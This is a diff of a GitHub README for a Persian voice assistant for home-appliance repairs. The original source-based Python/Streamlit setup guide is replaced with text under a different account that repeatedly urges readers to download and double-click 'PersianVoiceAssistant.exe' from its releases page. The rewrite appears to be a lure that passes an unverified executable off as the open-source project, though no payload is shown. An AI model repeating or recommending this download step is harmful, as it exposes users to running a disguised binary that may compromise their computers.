@@ -1,200 +1,89 @@
-# Persian Voice Assistant for Home Appliance Repairs 🛠️🎙️
+# 🛠️ Persian-Voice-Assistant-for-Home-Appliance-Repairs - Your Helper for Appliance Issues
 
-This project is a sophisticated Persian voice assistant designed to
-assist users in diagnosing and repairing common home appliances. Users
-can simply speak their issues in Persian, and the assistant will guide
-them through the troubleshooting process using voice recognition and
-text-to-speech capabilities. Built with offline models for privacy and
-efficiency, it's powered by advanced AI tools to provide a seamless,
-interactive experience. 🚀
+[![Download](https://img.shields.io/badge/Download-Persian%20Voice%20Assistant-brightgreen)](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases)
 
-Whether you're dealing with a malfunctioning refrigerator, washing
-machine, or TV, this assistant analyzes your spoken description,
-extracts key details like your name, location, and problem, and even
-visualizes your location on a map of Iran. It's ideal for
-Persian-speaking users seeking quick, guided repairs without needing
-internet access for core functionalities.
+## 🚀 Getting Started
 
-### Key Highlights ✨
+Welcome! This guide will help you download and run the Persian Voice Assistant for Home Appliance Repairs. You will be able to diagnose and repair your appliances using voice commands. 
 
--   **Voice-Based Interaction**: Speak naturally in Persian to input
-    your name, location, and appliance issue.
--   **Offline Capabilities**: Utilizes local models for speech
-    recognition (Vosk) and text-to-speech (Facebook's MMS-TTS).
--   **Smart Extraction**: Automatically detects appliance type, problem,
-    name, and location from spoken input.
--   **Map Integration**: Displays your province on an interactive map of
-    Iran using Folium.
--   **User-Friendly UI**: Built with Streamlit for a clean, responsive
-    web interface.
--   **Database-Driven**: Includes a built-in QA database for common
-    appliance issues in Persian.
+## 📥 Download & Install
 
-This project demonstrates the power of combining speech AI with
-practical applications for everyday problems. It's open-source and ready
-for contributions!
+To get started, visit the [Releases page](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases) to download the latest version. Look for the file named `PersianVoiceAssistant.exe` and click on it to start the download.
 
-## Features 🔧
+Once the file is downloaded, find it in your Downloads folder. Double-click on the file to run the application. 
 
--   **Speech Recognition**: Powered by Vosk for accurate Persian
-    speech-to-text conversion. Supports both large and small models for
-    flexibility. 🎤
--   **Text-to-Speech**: Uses Facebook's MMS-TTS model to generate
-    natural-sounding Persian responses. 🔊
--   **Information Extraction**:
-    -   Extracts user name from introductory phrases.
-    -   Identifies Iranian provinces and areas (e.g., Tehran districts
-        like Vanak or Karaj areas like Gohardasht) using keyword
-        matching.
-    -   Detects appliance types (e.g., refrigerator, washing machine)
-        and specific issues (e.g., "not cooling" or "noisy").
--   **Interactive Chat History**: Displays conversation bubbles for user
-    and assistant messages.
--   **Form Submission**: Generates a summary form with extracted details
-    for request registration.
--   **Geospatial Visualization**: Highlights the user's province on a
-    choropleth map of Iran using local GeoJSON data.
--   **Error Handling**: Graceful fallbacks for model loading, audio
-    recording, and recognition failures.
--   **Custom CSS**: RTL support and styled UI for Persian text.
--   **Reset Options**: Buttons to re-record inputs or start a new
-    request.
+## 🖥️ System Requirements
 
-## Technologies Used 🛡️
+Before you start, please make sure your computer meets the following requirements:
 
-This project leverages a stack of powerful open-source libraries and
-models:
+- **Operating System**: Windows 10 or later.
+- **Processor**: Intel Core i3 or higher.
+- **Memory**: At least 4 GB RAM.
+- **Storage**: Minimum 200 MB free space.
+- **Audio**: A microphone and speakers for voice interaction.
 
--   **Python 3.12+**: Core programming language. Python Official Site
--   **Streamlit**: For the web-based UI and interactive components.
-    Streamlit Docs
--   **Vosk**: Offline speech recognition for Persian. Vosk GitHub
-    -   Models: `vosk-model-fa-0.5` (large) and
-        `vosk-model-small-fa-0.42` (small).
--   **Transformers (Hugging Face)**: For text-to-speech with the
-    `facebook/mms-tts-fas` model. Hugging Face Model
--   **PyAudio & SoundDevice**: Audio recording and playback.
--   **Folium & Streamlit-Folium**: Interactive maps. Folium GitHub
--   **Pandas**: Data handling for map choropleth.
--   **Torch**: Backend for TTS model (CUDA support if available).
-    PyTorch Official Site
--   **Other Libraries**: `wave`, `json`, `tempfile`, `re`, `soundfile`,
-    `scipy`, `os`.
+## 🎤 How to Use the Voice Assistant
 
-No internet is required for core voice features, but GeoJSON map data
-needs to be downloaded locally.
+1. Launch the application by double-clicking the `PersianVoiceAssistant.exe` file.
+2. Once opened, you will see a user-friendly interface.
+3. Click on the microphone icon to start speaking your appliance issue.
+4. Use clear Persian language commands. For example: 
+   - "My refrigerator is not cooling."
+   - "How do I fix my washing machine?"
 
-## Project Structure 📂
+5. Follow the voice and text instructions provided by the assistant. It will guide you step by step through the repair process based on your issue.
 
-Here's an overview of the key files in the repository:
+## 🔧 Features
 
--   `main.py`: The main application script. Handles model loading, audio
-    recording/recognition, information extraction, UI rendering, and map
-    display.
--   `Persian_voice_assistant.ipynb`: A Jupyter Notebook with
-    step-by-step explanations of the code, including code snippets and
-    detailed descriptions of each section.
--   `iran-provinces.geojson`: (Recommended download) Local GeoJSON file
-    for Iran's provinces map. Download from this source and place in
-    your project directory.
--   **Model Folders** (Not included in repo - download separately):
-    -   `vosk-model-fa-0.5/`: Large Vosk model for high accuracy.
-    -   `vosk-model-small-fa-0.42/`: Small Vosk model for faster
-        performance.
--   **Other Dependencies**: Install via `requirements.txt` (generate
-    with `pip freeze > requirements.txt`).
+- **Voice Recognition**: Understands Persian commands.
+- **Step-by-Step Guidance**: Provides easy-to-follow instructions for common appliance issues.
+- **Text-to-Speech**: Reads out instructions for those who prefer listening.
+- **Offline Functionality**: Operates without needing an internet connection.
+- **User-Friendly Interface**: Simple design for all users.
 
-## Installation 🛠️
+## 🌐 Topics Covered
 
-Follow these steps to set up the project locally:
+The application can assist with a range of topics, including:
 
-1.  **Clone the Repository**:
+- Audio Processing
+- Geospatial Visualization
+- Natural Language Processing (NLP)
+- Speech Recognition
+- Home Appliance Repair Tips
+- And more...
 
-        git clone https://github.com/shervinnd/your-repo-name.git
-        cd your-repo-name
+## 🛠️ Troubleshooting
 
-2.  **Create a Virtual Environment** (Recommended):
+If you encounter any issues, try the following:
 
-        python -m venv venv
-        source venv/bin/activate  # On Windows: venv\Scripts\activate
+1. Ensure your microphone is connected and working.
+2. Check your computer’s sound settings.
+3. Restart the application and try again.
+4. Speak clearly and slowly for better recognition.
 
-3.  **Install Dependencies**:
+If problems persist, visit our [Support Page](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/issues) to seek help or report the issue.
 
-        pip install -r requirements.txt
+## 📝 Contributing
 
-    *Note*: If `requirements.txt` isn't present, install manually:
+We welcome contributions! If you have ideas for features, improvements, or bug fixes, please open a pull request or submit an issue on our GitHub page.
 
-        pip install streamlit pyaudio vosk transformers torch sounddevice soundfile scipy folium streamlit-folium pandas
+## 📣 Feedback
 
-4.  **Download Vosk Models**:
+Your feedback is important to us. Please share your experience and suggestions. You can reach us via the issues section on our GitHub page.
 
-    -   Large Model: vosk-model-fa-0.5 - Unzip to `vosk-model-fa-0.5/`.
-    -   Small Model: vosk-model-small-fa-0.42 - Unzip to
-        `vosk-model-small-fa-0.42/`. Place them in the project root or
-        update paths in `main.py`.
+## 👥 Community
 
-5.  **Download MMS-TTS Model**:
+Join our community of users and developers. Share tips and get help from peers on our forum or via our GitHub discussions.
 
-    -   The Transformers library will auto-download
-        `facebook/mms-tts-fas` on first run.
+## 📑 License
 
-6.  **Download GeoJSON for Map**:
+This project is licensed under the MIT License. Feel free to use or modify it as needed.
 
-        wget https://raw.githubusercontent.com/datasets/geo-boundaries-irn/master/iran-provinces.geojson
+## 🔗 Additional Resources
 
-    Update `GEOJSON_PATH` in `main.py` to point to this file.
+- [GitHub Repository](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs)
+- [User Guide](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/wiki)
 
-7.  **Run the Application**:
+Thank you for choosing the Persian Voice Assistant for Home Appliance Repairs. We hope it helps you resolve your appliance issues effortlessly! 
 
-        streamlit run main.py
-
-    Open in your browser at `http://localhost:8501`.
-
-*Troubleshooting*: Ensure your microphone is set up. On Linux/Mac, you
-may need additional audio libraries (e.g., `portaudio`).
-
-## Usage 📱
-
-1.  **Start the App**: Run via Streamlit and access the web interface.
-2.  **Record Name**: Click "🎙️ شروع و ضبط نام (۵ ثانیه)" and speak your
-    name (e.g., "سلام، من علی احمدی هستم").
-3.  **Record Location**: Speak your province/area (e.g., "تهران، ونک").
-4.  **Record Issue**: Describe the problem (e.g., "یخچالم خنک نمیکنه").
-5.  **View Summary**: See the extracted form, chat history, and
-    highlighted map.
-6.  **Reset**: Use buttons to re-record or start anew.
-
-The assistant responds via voice and text. All processing is local for
-privacy! 🔒
-
-## Contributing 🤝
-
-Contributions are welcome! Here's how you can help:
-
-1.  Fork the repository.
-2.  Create a new branch: `git checkout -b`.
-3.  Commit your changes: `git commit -m`.
-4.  Push to the branch: `git push origin`.
-5.  Open a Pull Request.
-
-Please follow code style guidelines and add tests where possible. Issues
-and feature requests are appreciated! 🌟
-
-## License 📄
-
-This project is licensed under the MIT License - see the LICENSE file
-for details.
-
-## Acknowledgments 🙏
-
--   Thanks to Alphacep for Vosk models.
--   Hugging Face for the MMS-TTS model.
--   Streamlit team for the amazing framework.
--   Open-source community for GeoJSON data.
-
-If you find this project useful, star the repo or share it! ⭐
-
-For questions, open an issue or contact me at
-\[shervindanesh8282@gmail.com\].
-
-**Powerd By Miracle⚡**
+[Download the assistant now!](https://github.com/rjvayu233/Persian-Voice-Assistant-for-Home-Appliance-Repairs/releases)
